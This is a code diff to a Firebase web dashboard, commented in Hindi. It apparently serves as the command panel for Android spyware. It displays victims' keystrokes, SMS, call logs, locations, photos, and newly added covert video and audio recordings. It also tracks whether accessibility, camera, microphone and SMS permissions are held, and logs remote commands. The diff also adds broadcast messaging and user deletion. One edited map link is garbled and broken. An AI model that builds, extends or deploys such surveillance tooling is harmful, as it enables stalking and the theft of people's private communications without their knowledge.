@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta name="robots" content="noindex">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Beta Dashboard</title>
-    <meta name="robots" content="noindex">
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -193,7 +193,7 @@
             transform: rotate(180deg);
         }
 
-        #send-notification-btn, #logout-btn {
+        #send-notification-btn, #send-to-all-btn, #logout-btn, #delete-user-btn {
             color: white;
             padding: 10px 15px;
             border: none;
@@ -203,6 +203,8 @@
             font-weight: 600;
         }
         #send-notification-btn { background: var(--accent-green); display: none; }
+        #send-to-all-btn { background: var(--accent-purple); }
+        #delete-user-btn { background: var(--accent-red); display: none; }
         #logout-btn { background: var(--accent-red); }
 
         #details-view { display: none; }
@@ -279,16 +281,25 @@
         }
         
         .data-header { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
-        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn { color: white; padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
+        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn, .record-btn { color: white; padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
         .clear-category-btn { background-color: var(--accent-red); }
         .capture-photo-btn { background-color: var(--accent-green); }
         #refresh-photos-btn { background-color: var(--accent-blue); }
-        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
-        .photo-card { background-color: var(--secondary-dark); border-radius: 12px; overflow: hidden; border: 1px solid var(--border-color); }
+        .record-btn { background-color: var(--accent-green); }
+
+        .photo-grid, .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
+        .photo-card, .video-card { background-color: var(--secondary-dark); border-radius: 12px; overflow: hidden; border: 1px solid var(--border-color); }
         .photo-card img { width: 100%; height: 180px; object-fit: cover; }
-        .photo-info { padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
-        .photo-time { font-size: 0.8rem; color: var(--text-secondary); }
+        .video-card video { width: 100%; height: 180px; background-color: #000; }
+        .photo-info, .video-info { padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
+        .photo-time, .video-time { font-size: 0.8rem; color: var(--text-secondary); }
         .view-btn { background-color: var(--accent-blue); color: white; border: none; border-radius: 6px; width: 36px; height: 36px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        
+        .audio-list { display: flex; flex-direction: column; gap: 1rem; }
+        .audio-card { background-color: var(--secondary-dark); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border-color); }
+        .audio-card audio { width: 100%; }
+        .audio-time { font-size: 0.8rem; color: var(--text-secondary); text-align: right; margin-top: 1rem; }
+
         .map-link { display: inline-flex; align-items: center; gap: 8px; margin-top: 1.5rem; padding: 12px 20px; background-color: var(--accent-blue); color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; transition: background-color 0.3s; }
         .map-link:hover { opacity: 0.9; }
         #login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
@@ -333,7 +344,36 @@
         .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
         .modal-body textarea, .modal-body input { width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary); font-size: 1rem; margin-bottom: 1rem; }
         .modal-footer { margin-top: 1rem; text-align: right; }
-        .modal-footer button { background-color: var(--accent-blue); color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 1rem;
+        }
+        .modal-footer .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .modal-footer .btn-secondary {
+            background-color: var(--secondary-dark);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+        .modal-footer .btn-danger {
+            background-color: var(--accent-red);
+            color: white;
+        }
+        #send-notification-submit-btn {
+            background-color: var(--accent-blue);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
         .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
         .live-chat-area { display: flex; flex-direction: column; height: 100%; }
         .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column-reverse; gap: 0.75rem; }
@@ -391,6 +431,115 @@
             border-radius: 5px;
             transition: width 0.5s ease;
         }
+
+        /* Health and Command History Styles */
+        .health-status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .health-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: var(--secondary-dark);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+        
+        .health-item .icon {
+            font-size: 20px;
+        }
+        
+        .health-item .enabled {
+            color: var(--accent-green);
+        }
+
+        .health-item .disabled {
+            color: var(--accent-red);
+        }
+
+        .command-history-list {
+            margin-top: 2.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .command-history-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            color: #fff;
+        }
+
+        .command-item {
+            position: relative;
+            padding: 1rem;
+            padding-left: 2.5rem;
+            margin-bottom: 1.5rem;
+            border-left: 3px solid var(--secondary-dark);
+        }
+
+        .command-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .command-icon {
+            position: absolute;
+            left: -14px;
+            top: 1rem;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--bg-dark);
+            border: 3px solid var(--secondary-dark);
+            /* ======================================================================= */
+            /* ===== बग फिक्स #1: लोगो को कटने से बचाने के लिए CSS फिक्स ===== */
+            /* flex-shrink: 0; यह सुनिश्चित करता है कि फ्लेक्स कंटेनर में होने पर आइकन का आकार छोटा न हो, जिससे वह गोल बना रहता है। */
+            /* ======================================================================= */
+            flex-shrink: 0;
+            /* ======================================================================= */
+        }
+        
+        .command-item.success .command-icon { border-color: var(--accent-green); }
+        .command-item.progress .command-icon { border-color: var(--accent-blue); }
+        .command-item.initiated .command-icon { border-color: var(--accent-purple); }
+
+        .command-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            flex-wrap: wrap;
+        }
+        .command-type {
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        .command-time {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+        }
+        .command-details {
+            font-size: 0.95rem;
+            color: var(--text-primary);
+        }
+        .command-status {
+            display: inline-block;
+            margin-top: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            background-color: var(--secondary-dark);
+        }
+        .command-status.success { background-color: rgba(63, 185, 80, 0.2); color: var(--accent-green); }
+        .command-status.progress { background-color: rgba(88, 166, 255, 0.2); color: var(--accent-blue); }
+        .command-status.initiated { background-color: rgba(155, 89, 182, 0.2); color: var(--accent-purple); }
 
         @media (max-width: 992px) {
             .sidebar {
@@ -458,16 +607,21 @@
 
                 <div class="header-buttons">
                     <button id="send-notification-btn">Send Notification</button>
+                    <button id="send-to-all-btn">Send to All</button>
+                    <button id="delete-user-btn">Delete User</button>
                     <button id="logout-btn">Logout</button>
                 </div>
             </header>
 
             <div id="details-view">
                 <div class="category-buttons">
-                    <!-- Device Status को सबसे पहले लाया गया -->
                     <button class="category-btn" data-category="devicestatus">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                         <span>Device Status</span>
+                    </button>
+                    <button class="category-btn" data-category="health">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#e57373" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                        <span>Health & Logs</span>
                     </button>
                     <button class="category-btn" data-category="location">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
@@ -476,6 +630,14 @@
                     <button class="category-btn" data-category="photo">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                         <span>Photos</span>
+                    </button>
+                    <button class="category-btn" data-category="video">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff7043" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                        <span>Videos</span>
+                    </button>
+                    <button class="category-btn" data-category="audio">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26a69a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
+                        <span>Audio</span>
                     </button>
                     <button class="category-btn" data-category="keylogger">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
@@ -486,7 +648,7 @@
                         <span>SMS</span>
                     </button>
                     <button class="category-btn" data-category="calllogs">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81 .7A2 2 0 0 1 22 16.92z"></path></svg>
                         <span>Call Logs</span>
                     </button>
                     <button class="category-btn" data-category="notifications">
@@ -526,13 +688,26 @@
             </div>
         </div>
     </div>
-
-
+    <div id="delete-user-modal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h3>Permanently Delete User</h3>
+                <button class="modal-close-btn">×</button>
+            </div>
+            <div class="modal-body">
+                <p id="delete-user-info" style="font-size: 1.1rem; line-height: 1.6; text-align: center; margin-bottom: 1rem;"></p>
+                <p style="text-align: center; color: var(--text-secondary);">This action is irreversible and will delete all data associated with this user from the database.</p>
+            </div>
+            <div class="modal-footer">
+                <button id="cancel-user-delete-btn" class="btn btn-secondary">Cancel</button>
+                <button id="confirm-user-delete-btn" class="btn btn-danger">Yes, Delete User</button>
+            </div>
+        </div>
+    </div>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
-        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
-        // Storage is no longer needed for photos, but keep it for other potential uses.
+        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off, get } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
         import { getStorage, ref as storageRef, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
         const firebaseConfig = {
@@ -565,16 +740,24 @@
         const modalDataDisplayArea = document.getElementById('modal-data-display-area');
         const notificationModal = document.getElementById('notification-modal');
         const sendNotificationBtn = document.getElementById('send-notification-btn');
+        const sendToAllBtn = document.getElementById('send-to-all-btn');
         const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');
         const notificationMessageInput = document.getElementById('notification-message-input');
         const menuBtn = document.getElementById('menu-btn');
         const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
         const sidebarTitle = document.getElementById('sidebar-title');
+        const deleteUserBtn = document.getElementById('delete-user-btn');
+        const deleteUserModal = document.getElementById('delete-user-modal');
+        const confirmUserDeleteBtn = document.getElementById('confirm-user-delete-btn');
+        const cancelUserDeleteBtn = document.getElementById('cancel-user-delete-btn');
+        const deleteUserInfo = document.getElementById('delete-user-info');
+
 
         // State
         let activeDataListener = null;
         let selectedUserInfo = {};
         let activeChatListeners = []; 
+        let isSendingToAll = false;
         
         let fullKeyloggerData = [];
         let renderedKeyloggerCount = 0;
@@ -621,6 +804,43 @@
             modalElement.style.display = 'none';
             document.body.classList.remove('modal-open');
         }
+
+        // =======================================================================
+        // ===== बग फिक्स #3: सही और सुसंगत (consistent) डेट-टाइम फॉर्मेटिंग के लिए नया फंक्शन =====
+        // यह फंक्शन एक Unix timestamp (मिलीसेकंड में) लेता है और उसे 'DD/MM/YYYY, h:mm:ss a' फॉर्मेट में बदलता है।
+        // यह भारतीय समय (Indian Standard Time) के अनुसार सही समय दिखाएगा।
+        // =======================================================================
+        function formatTimestamp(timestamp) {
+            // यदि timestamp मौजूद नहीं है या 0 है, तो 'N/A' दिखाएं।
+            if (!timestamp) return 'N/A';
+            
+            // दिए गए timestamp से एक नया Date ऑब्जेक्ट बनाएं।
+            const date = new Date(timestamp);
+            
+            // यदि timestamp अमान्य है, तो 'Invalid Date' दिखाएं।
+            if (isNaN(date.getTime())) {
+                return 'Invalid Date';
+            }
+
+            // Intl.DateTimeFormat का उपयोग करके दिनांक और समय को स्थानीय प्रारूप में बदलें।
+            // 'en-IN' locale भारतीय प्रारूप (DD-MM-YYYY) के लिए है।
+            // timeZone: 'Asia/Kolkata' यह सुनिश्चित करता है कि समय हमेशा IST में हो।
+            const options = {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true, // AM/PM फॉर्मेट के लिए।
+                timeZone: 'Asia/Kolkata'
+            };
+            
+            // date.toLocaleString() का उपयोग करके इसे एक पठनीय स्ट्रिंग में बदलें।
+            return date.toLocaleString('en-IN', options);
+        }
+        // =======================================================================
+
 
         // --- Auth & Main Listeners ---
         document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
@@ -734,7 +954,8 @@
                 };
                 mainContentTitle.textContent = selectedUserInfo.userName;
                 detailsView.style.display = 'block';
-                sendNotificationBtn.style.display = 'inline-flex'; 
+                sendNotificationBtn.style.display = 'inline-flex';
+                deleteUserBtn.style.display = 'inline-flex';
                 
                 const mainChatButton = document.querySelector('.category-btn[data-category="chat"]');
                 const existingMainIndicator = mainChatButton.querySelector('.chat-notification-indicator');
@@ -750,6 +971,45 @@
                     sidebar.classList.remove('open');
                     overlay.style.display = 'none';
                 }
+            }
+        });
+
+        function resetDashboardView() {
+            mainContentTitle.textContent = 'Select a User';
+            detailsView.style.display = 'none';
+            sendNotificationBtn.style.display = 'none';
+            deleteUserBtn.style.display = 'none';
+            selectedUserInfo = {};
+            document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
+        }
+
+        deleteUserBtn.addEventListener('click', () => {
+            if (selectedUserInfo.userId && selectedUserInfo.userName) {
+                deleteUserInfo.textContent = `Are you sure you want to delete all data for the user '${selectedUserInfo.userName}' (ID: ${selectedUserInfo.userId})?`;
+                openModal(deleteUserModal);
+            } else {
+                alert('Please select a user first.');
+            }
+        });
+
+        cancelUserDeleteBtn.addEventListener('click', () => {
+            closeModal(deleteUserModal);
+        });
+
+        confirmUserDeleteBtn.addEventListener('click', () => {
+            const { userId, userName } = selectedUserInfo;
+            if (userId) {
+                const userRef = ref(db, `user/${userId}`);
+                remove(userRef)
+                    .then(() => {
+                        alert(`User '${userName}' has been permanently deleted.`);
+                        closeModal(deleteUserModal);
+                        resetDashboardView(); 
+                    })
+                    .catch(error => {
+                        alert('Error deleting user: ' + error.message);
+                        closeModal(deleteUserModal);
+                    });
             }
         });
 
@@ -787,18 +1047,73 @@
         
         sendNotificationBtn.addEventListener('click', () => {
             if (selectedUserInfo.userId) {
+                isSendingToAll = false;
                 document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
                 notificationMessageInput.value = '';
                 openModal(notificationModal);
             } else { alert('Please select a user first.'); }
         });
         
+        sendToAllBtn.addEventListener('click', () => {
+            isSendingToAll = true;
+            document.getElementById('notification-modal-title').textContent = 'Send Notification to All Users';
+            notificationMessageInput.value = '';
+            openModal(notificationModal);
+        });
+        
         sendNotificationSubmitBtn.addEventListener('click', () => {
             const message = notificationMessageInput.value.trim();
-            if (message && selectedUserInfo.userId && selectedUserInfo.childKey) {
-                push(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`), { message: message, timestamp: serverTimestamp(), read: false })
-                    .then(() => { alert('Notification sent successfully!'); closeModal(notificationModal); })
-                    .catch(error => { alert('Failed to send notification: ' + error.message); });
+            if (!message) {
+                alert('Message cannot be empty.');
+                return;
+            }
+
+            if (isSendingToAll) {
+                if (confirm('Are you sure you want to send this notification to ALL users?')) {
+                    const usersRef = ref(db, 'user');
+                    onValue(usersRef, (snapshot) => {
+                        if (snapshot.exists()) {
+                            const usersData = snapshot.val();
+                            const updates = {};
+                            const notificationPayload = {
+                                message: message,
+                                timestamp: serverTimestamp(),
+                                read: false
+                            };
+
+                            Object.keys(usersData).forEach(userId => {
+                                Object.keys(usersData[userId]).forEach(childKey => {
+                                    const newNotificationKey = push(ref(db, `user/${userId}/${childKey}/adminNotifications`)).key;
+                                    updates[`user/${userId}/${childKey}/adminNotifications/${newNotificationKey}`] = notificationPayload;
+                                });
+                            });
+
+                            update(ref(db), updates)
+                                .then(() => {
+                                    alert('Notification sent to all users successfully!');
+                                    closeModal(notificationModal);
+                                })
+                                .catch(error => {
+                                    alert('Failed to send notifications to all users: ' + error.message);
+                                });
+                        } else {
+                            alert('No users found to send notifications to.');
+                        }
+                    }, { onlyOnce: true });
+                }
+            } else {
+                if (selectedUserInfo.userId && selectedUserInfo.childKey) {
+                    push(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`), { message: message, timestamp: serverTimestamp(), read: false })
+                        .then(() => {
+                            alert('Notification sent successfully!');
+                            closeModal(notificationModal);
+                        })
+                        .catch(error => {
+                            alert('Failed to send notification: ' + error.message);
+                        });
+                } else {
+                    alert('No user selected.');
+                }
             }
         });
 
@@ -808,7 +1123,7 @@
             const currentBtn = document.querySelector(`.category-btn[data-category="${category}"]`);
             if (currentBtn) currentBtn.classList.add('active');
             
-            if (activeDataListener) { off(activeDataListener.ref, 'value', activeDataListener.callback); activeDataListener = null; }
+            detachAllListeners();
             
             modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
             
@@ -819,12 +1134,41 @@
             }
             
             document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
-
+            
             if (category === 'photo') { renderPhotosFromDatabase(userId, childKey); return; }
+            if (category === 'video') { renderVideosFromDatabase(userId, childKey); return; }
+            if (category === 'audio') { renderAudiosFromDatabase(userId, childKey); return; }
             if (category === 'chat') { renderChat(userId, childKey); return; }
             
-            const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
+            // =========================================================================================
+            // ===== बग फिक्स #2: कमांड हिस्ट्री को रियल-टाइम बनाने के लिए लॉजिक में बदलाव =====
+            // पुराना लॉजिक केवल एक डेटा पाथ से डेटा लाता था और रियल-टाइम नहीं था।
+            // नया लॉजिक: अब हम CommandHistory के लिए onValue() का उपयोग करेंगे, जो रियल-टाइम अपडेट सुनिश्चित करता है।
+            // जब भी CommandHistory में कोई बदलाव होगा, तो यह Health डेटा को फिर से प्राप्त करेगा और दोनों को एक साथ रेंडर करेगा।
+            // =========================================================================================
+            if (category === 'health') {
+                const healthRef = ref(db, getCategoryPath('health', userId, childKey));
+                const historyRef = ref(db, getCategoryPath('CommandHistory', userId, childKey));
+
+                // यह कॉलबैक फंक्शन तब चलेगा जब भी 'CommandHistory' नोड में कोई बदलाव होगा।
+                const callback = (historySnapshot) => {
+                    // जब भी हिस्ट्री अपडेट होती है, हम हेल्थ डेटा को फिर से मंगवाते हैं ताकि दोनों हमेशा सिंक में रहें।
+                    get(healthRef).then((healthSnapshot) => {
+                        renderHealthAndCommandHistory(healthSnapshot.val(), historySnapshot.val());
+                    });
+                };
+                
+                // onValue() एक रियल-टाइम लिस्नर सेट करता है।
+                onValue(historyRef, callback);
+                // लिस्नर को सेव करें ताकि बाद में हटाया जा सके।
+                activeDataListener = { ref: historyRef, callback: callback };
+                return; 
+            }
+            // =======================================================================
+            
+            const dataPath = getCategoryPath(category, userId, childKey);
             const dataRef = ref(db, dataPath);
+
             const callback = (snapshot) => { 
                 if (category === 'keylogger') {
                     setupKeyloggerDisplay(snapshot.val());
@@ -916,7 +1260,8 @@
                         const message = messages[key];
                         const bubble = document.createElement('div');
                         bubble.classList.add('chat-bubble', message.sender);
-                        const time = message.timestamp ? new Date(message.timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }) : '';
+                        // बग फिक्स #3 का उपयोग: चैट में भी सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
+                        const time = message.timestamp ? formatTimestamp(message.timestamp) : '';
                         bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
                         chatMessagesArea.prepend(bubble);
                     });
@@ -938,6 +1283,91 @@
             chatMessageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
         }
         
+        function renderHealthAndCommandHistory(healthData, historyData) {
+            // =======================================================================
+            // ===== नया फीचर #4: 'Clear Command History' बटन को HTML में जोड़ना =====
+            // =======================================================================
+            let headerHTML = `<div class="data-header">
+                                <button class="clear-category-btn" data-category="CommandHistory">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+                                    <span>Clear Command History</span>
+                                </button>
+                              </div>`;
+            
+            let healthHTML = '<h3>App Health Status</h3>';
+            if (healthData) {
+                // बग फिक्स #3 का उपयोग: हेल्थ डेटा में भी सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
+                let lastChecked = healthData.lastCheckedTimestamp ? formatTimestamp(healthData.lastCheckedTimestamp) : 'N/A';
+                let heartbeat = healthData.lastHeartbeatTime ? formatTimestamp(healthData.lastHeartbeatTime) : 'N/A';
+
+                const createHealthItem = (label, isEnabled) => {
+                    const statusClass = isEnabled ? 'enabled' : 'disabled';
+                    const icon = isEnabled ? '✅' : '❌';
+                    return `<div class="health-item"><span class="icon ${statusClass}">${icon}</span><span>${label}</span></div>`;
+                };
+
+                healthHTML += `
+                    <div style="font-size: 1.1rem; line-height: 1.8; margin: 1rem 0 2rem 0;">
+                        <p><strong>App Version:</strong> ${healthData.appVersion || 'N/A'}</p>
+                        <p><strong>Last Checked:</strong> ${lastChecked}</p>
+                        <p><strong>Last Heartbeat:</strong> ${heartbeat}</p>
+                    </div>
+                    <div class="health-status-grid">
+                        ${createHealthItem('Accessibility Service', healthData.accessibilityServiceEnabled)}
+                        ${createHealthItem('Notification Service', healthData.notificationServiceEnabled)}
+                        ${createHealthItem('Camera Permission', healthData.hasCameraPermission)}
+                        ${createHealthItem('Microphone Permission', healthData.hasMicrophonePermission)}
+                        ${createHealthItem('Location Permission', healthData.hasLocationPermission)}
+                        ${createHealthItem('SMS Permission', healthData.hasSmsPermission)}
+                        ${createHealthItem('Call Log Permission', healthData.hasCallLogPermission)}
+                        ${createHealthItem('Draw Over Apps', healthData.hasDrawOverAppsPermission)}
+                        ${createHealthItem('Ignoring Battery Optimizations', healthData.ignoringBatteryOptimizations)}
+                    </div>
+                `;
+            } else {
+                healthHTML += '<p>No health data available.</p>';
+            }
+
+            let historyHTML = '<div class="command-history-list"><h3 class="command-history-title">Command History</h3>';
+            if (historyData) {
+                const historyArray = Object.values(historyData).reverse();
+                historyArray.forEach(log => {
+                    // बग फिक्स #3 का उपयोग: कमांड हिस्ट्री में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
+                    const time = formatTimestamp(log.timestamp);
+                    let statusClass = '';
+                    let iconSVG = '';
+                    
+                    if (log.status.includes('SUCCESS')) {
+                        statusClass = 'success';
+                        iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+                    } else if (log.status.includes('STARTED')) {
+                         statusClass = 'initiated';
+                         iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>`;
+                    } else {
+                        statusClass = 'progress';
+                        iconSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"></line></svg>`;
+                    }
+
+                    historyHTML += `
+                        <div class="command-item ${statusClass}">
+                            <div class="command-icon">${iconSVG}</div>
+                            <div class="command-header">
+                                <span class="command-type">${log.commandType}</span>
+                                <span class="command-time">${time}</span>
+                            </div>
+                            <p class="command-details">${log.details}</p>
+                            <span class="command-status ${statusClass}">${log.status}</span>
+                        </div>
+                    `;
+                });
+            } else {
+                historyHTML += '<p>No command history available.</p>';
+            }
+            historyHTML += '</div>';
+            
+            modalDataDisplayArea.innerHTML = headerHTML + healthHTML + historyHTML;
+        }
+
         function renderData(category, data) {
             let headerHTML = '';
             let contentHTML = '';
@@ -953,7 +1383,7 @@
                     case 'location':
                         let mapLink = '';
                         if (data.latitude && data.longitude) {
-                             mapLink = `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                             mapLink = `<a href="http://googleusercontent.com/maps.google.com/4{data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                         }
